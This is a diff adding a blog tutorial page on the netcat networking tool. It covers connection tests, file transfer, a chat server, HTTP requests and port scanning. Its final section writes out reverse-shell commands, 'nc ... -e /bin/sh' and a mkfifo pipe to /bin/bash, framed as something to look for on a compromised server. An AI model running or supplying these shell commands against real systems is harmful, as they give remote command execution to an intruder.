@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+
+    <title>Basic Networking tool: netcat</title>
+
+    
+    
+    <meta name="description" content="
+
+netcat - The TCP/IP swiss army knife netcat (abbreviated nc) is a networking utility to read and write content with networking connections(TCP or UDP).
+
+ nc has rich features and many built-i...">
+    <link rel="canonical" href="http://coderscat.com/basic-networking-tool-netcat/" />
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Basic Networking tool: netcat">
+    <meta property="og:description" content="
+
+netcat - The TCP/IP swiss army knife netcat (abbreviated nc) is a networking utility to read and write content with networking connections(TCP or UDP).
+
+ nc has rich features and many built-i...">
+    <meta property="og:url" content="http://coderscat.com/basic-networking-tool-netcat/" />
+    <meta property="og:site_name" content="Coder's Cat">
+    <meta property="article:publisher" content="https://www.facebook.com/coderscat">
+    <meta property="article:tag" content="">
+    <meta property="article:section" content="">
+    <meta property="article:published_time" content="2020-03-09 12:22:00">
+    <meta property="article:modified_time" content="2020-03-09 12:22:00">
+    <meta property="og:updated_time" content="2020-03-09 12:22:00">
+    <meta property="og:image" content="http://coderscat.com/images/2020_03_09_basic-networking-tool-netcat.org_20200309_171643.png"/>
+    <meta property="og:image:secure_url" content="http://coderscat.com/images/2020_03_09_basic-networking-tool-netcat.org_20200309_171643.png"/>
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="400">
+    <meta property="og:image:alt" content="CodersCat">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Basic Networking tool: netcat">
+    <meta name="twitter:description" content="
+
+netcat - The TCP/IP swiss army knife netcat (abbreviated nc) is a networking utility to read and write content with networking connections(TCP or UDP).
+
+ nc has rich features and many built-i...">
+    <meta name="twitter:site" content="@coderscat">
+    <meta name="twitter:creator" content="@coderscat">
+    <meta name="twitter:image" content="http://coderscat.com/images/2020_03_09_basic-networking-tool-netcat.org_20200309_171643.png"/>
+
+
+
+    <link rel="icon" type="image/png" sizes="32x32" href="/css/images/favicon-32x32.ico">
+    <link rel="icon" type="image/png" sizes="16x16" href="/css/images/favicon-16x16.ico">
+
+    <title>
+        
+            Basic Networking tool: netcat | Coder&#39;s Cat
+        
+    </title>  
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/plugins/fonts.css">
+
+    
+<link rel="stylesheet" href="/css/plugins/code.css">
+
+    
+<link rel="stylesheet" href="/css/plugins/nprogress.min.css">
+
+    <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+    
+<script src="/js/jquery.min.js"></script>
+
+  <script type="text/javascript" src="/js/geopattern.min.js"></script>
+  <script type="text/javascript" src="/js/nprogress.min.js"></script>
+
+
+  <script type="text/javascript" async src="https://platform-api.sharethis.com/js/sharethis.js#property=5fa8f493be36290012aa2a0d&product=inline-share-buttons"></script>
+
+  <div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+      <img src="/css/images/logo.png" width='400px' height='400px'/>
+  </div>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-77282254-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-77282254-2');
+</script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Coder's Cat</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/data-structures/" class="item-link">D&S</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/algorithms/" class="item-link">Algo</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/programming-languages/" class="item-link">PL</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/system/" class="item-link">System</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tools/" class="item-link">Tools</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      <li class="list-item" style="margin: 0">
+       <a class="icon-small" href="/search">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-search fa-stack-1x fa-inverse"></i>
+        </span>
+       </a>
+      </li>
+
+      <li class="list-item" style="margin: 0">
+        <a class="icon-small" href="/atom.xml">
+         <span class="fa-stack fa-lg">
+           <i class="fa fa-rss fa-inverse"></i>
+         </span>
+        </a>
+       </li>
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/data-structures/" class="menu-link">D&S</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/algorithms/" class="menu-link">Algo</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/programming-languages/" class="menu-link">PL</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/system/" class="menu-link">System</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tools/" class="menu-link">Tools</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+
+
+        <li class="list-item" style="margin: 0">
+          <a class="icon-small" href="/search">
+           <span class="fa-stack">
+             <i class="fa fa-search"></i>
+           </span>
+          </a>
+         </li>
+
+         
+      <li class="list-item" style="margin: 0">
+        <a class="icon-small" href="/atom.xml">
+         <span class="fa-stack fa-lg">
+           <i id="rss-icon" class="fa fa-rss fa-inverse"></i>
+         </span>
+        </a>
+       </li>
+
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Basic Networking tool: netcat</h2>
+  <p class="post-date">2020-03-09</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content">
+      <p><img src="/images/2020_03_09_basic-networking-tool-netcat.org_20200309_171643.png" alt="file:img/2020_03_09_basic-networking-tool-netcat.org_20200309_171643.png"></p>
+<blockquote>
+<p>netcat - The TCP/IP swiss army knife<br> <code>netcat</code> (abbreviated nc) is a networking utility to read and write content with networking connections(TCP or UDP).</p>
+</blockquote>
+<p> <code>nc</code> has rich features and many built-in capabilities, it’s a perfect tool for networking debugging and investigation.</p>
+<p> Some typical usage is:</p>
+<h2 id="Test-TCP-connection"><a href="#Test-TCP-connection" class="headerlink" title="Test TCP connection"></a>Test TCP connection</h2> <figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">nc -zv [host or ip] [port]<br></code></pre></td></tr></table></figure>
+
+<p> The option <code>-z</code> means run <code>nc</code> in Zero-I/O mode, this is used for scanning or connectivity testing.</p>
+<p> The option <code>-v</code> means run in verbose mode, so output will contain more information:</p>
+<p> <img src="/images/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_152034.png" alt="file:img/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_152034.png"></p>
+<p> Since <code>nc</code> outputs the data received from connection, we can use it to transfer file from client to server.</p>
+<p> Run command in the server side:</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -l 1499 &gt; data.out<br></code></pre></td></tr></table></figure>
+
+<p> Run command in the client side:</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc server.com 1499 &lt; data.in<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="Create-a-simple-server-or-client"><a href="#Create-a-simple-server-or-client" class="headerlink" title="Create a simple server or client"></a>Create a simple server or client</h2><p> <code>nc</code> could be used to create a simple server or client. Let’s build a chat server with a client:</p>
+<p> Firstly, we start a server and listen to port 1234:</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -l 1234<br></code></pre></td></tr></table></figure>
+
+<p> Then we start a client and connect to the same port:</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc 127.0.0.1 1234<br></code></pre></td></tr></table></figure>
+
+<p> After the connection is created successfully, the client could send a message to the server, server could also send messages to the client.</p>
+<p> <img src="/images/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_153128.png" alt="file:img/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_153128.png"></p>
+<p> Use “Ctrl-C” on any side to disconnect and quit it.</p>
+<h2 id="Send-an-HTTP-request"><a href="#Send-an-HTTP-request" class="headerlink" title="Send an HTTP request"></a>Send an HTTP request</h2><p> <code>nc</code>, of course, can be used to send an HTTP request from the terminal. We can use a pipeline to pass the request header and body.</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">echo -ne &quot;GET / HTTP/1.1\r\nhost:coderscat.com\r\n\r\n&quot; | nc -v coderscat.com 443<br></code></pre></td></tr></table></figure>
+
+<p> The output indicates we send HTTP request successfully. But 443 is the port for HTTPS, which will reject the plain request.</p>
+<p> <img src="/images/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_154116.png" alt="file:img/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_154116.png"></p>
+<h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p> <code>nc</code> can be used to scan multiple ports. This is useful when you don’t know which port is open.</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -v -n 127.0.0.1 port-range<br></code></pre></td></tr></table></figure>
+
+<p> In this case, we create a server listens to the port 1234, then use <code>nc</code> to scan the port range of <code>1230-1235</code>.</p>
+<p> <img src="/images/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_155930.png" alt="file:img/CAPTURE-2020_03_09_basic-networking-tool-netcat.org_20200309_155930.png"></p>
+<h2 id="Launching-Reverse-Shells-Backdoor"><a href="#Launching-Reverse-Shells-Backdoor" class="headerlink" title="Launching Reverse Shells (Backdoor)"></a>Launching Reverse Shells (Backdoor)</h2><p> If you have investigated a server that is suspected of being hacked, you will know an important thing is to have a check on the processes of <code>nc</code>.</p>
+<p> Because <code>nc</code> can be used be run a reverse shell. So that a hacker may execute commands on your server.</p>
+<p> Server side:</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">nc 127.0.0.1 4444 -e &#x2F;bin&#x2F;sh<br></code></pre></td></tr></table></figure>
+
+<p> Client side:</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">nc server-host.example.com 4444<br></code></pre></td></tr></table></figure>
+
+<p> NOTE: If the installed <code>nc</code> is an OpenBSD variant, there will no such a <code>-e</code> option to execute a shell.</p>
+<p> For instance, if I run command line <code>nc 127.0.0.1 4444 -e /bin/sh</code>, the output will be:</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">nc: unrecognized option &#39;-e&#39;<br></code></pre></td></tr></table></figure>
+
+<p> An alternative way to workaround is:</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mkfifo foo ; nc -lk 4444 0&lt;foo | /bin/bash 1&gt;foo<br></code></pre></td></tr></table></figure>
+
+    </section>
+
+     <div>
+          <p style="text-align:center; color: #12472d; margin-left: 2%; margin-right: 2%;"><b>Join my <a target="_blank" rel="noopener" href="http://codercat.substack.com">Email List</a> for more insights, It's Free!&#128523;	</b></p>
+          <iframe src="https://codercat.substack.com/embed" width="96%" height="350" style="border:2px solid #EEE; background:rgb(248, 244, 244); margin-left: 2%; margin-right: 2%;" frameborder="1" scrolling="no"></iframe>
+      </div>
+    
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Networking" >
+    <span class="tag-code-index">Networking</span>
+  </a>
+
+
+      </div>
+    
+
+    <div class="sharethis-inline-share-buttons"></div>
+
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/basic-networking-tool-netstat/">
+        <span class="nav-arrow">← </span>
+        
+          Basic Networking Tool: netstat
+        
+      </a>
+    
+    
+        <a class="nav-right" href="/basic-networking-tools-telnet/">
+            
+                Basic Networking tool: telnet
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+
+    <!-- NAV END -->
+
+    <script src="https://utteranc.es/client.js"
+            repo="nickmose8/coderscat-comments"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+      <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title"></strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Test-TCP-connection"><span class="toc-nav-text">Test TCP connection</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Create-a-simple-server-or-client"><span class="toc-nav-text">Create a simple server or client</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Send-an-HTTP-request"><span class="toc-nav-text">Send an HTTP request</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Port-scanning"><span class="toc-nav-text">Port scanning</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Launching-Reverse-Shells-Backdoor"><span class="toc-nav-text">Launching Reverse Shells (Backdoor)</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+
+</main>
+
+
+
+
+<script>
+  (function () {
+    var url = 'http://coderscat.com/basic-networking-tool-netcat/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+
+  })();
+</script>
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer" id="footer">
+    <p class="copyright">
+        &copy; 2022 | CodersCat
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+ var hasLine = 'false';
+ async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+     $('figure pre').each(function(i, block) {
+         var figure = $(this).parents('figure');
+         if (hasLine === 'false') {
+             figure.find('.gutter').hide();
+         }
+         var lang = figure.attr('class').split(' ')[1] || 'code';
+         var codeHtml = $(this).html();
+         var codeTag = document.createElement('code');
+         codeTag.className = lang;
+         codeTag.innerHTML = codeHtml;
+         $(this).attr('class', '').empty().html(codeTag);
+         figure.attr('data-lang', lang.toUpperCase());
+     });
+ })
+</script>
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
